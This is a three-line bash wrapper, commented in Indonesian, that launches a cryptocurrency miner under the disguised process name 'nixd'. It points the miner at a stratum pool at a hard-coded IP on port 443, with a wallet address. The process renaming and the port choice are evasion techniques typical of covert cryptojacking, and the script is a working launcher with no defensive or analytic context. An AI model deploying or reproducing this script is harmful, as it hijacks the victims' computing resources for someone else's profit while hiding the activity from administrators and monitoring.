#!/bin/bash
# Wrapper untuk menjalankan miner dengan nama proses 'nixd'.
exec -a nixd ./nixd -a power2b -o stratum+tcp://47.84.55.99:443 -u MevDnQVzEy3aLmQdpU52Tz6MyviwxCE3Er -p x -t 1
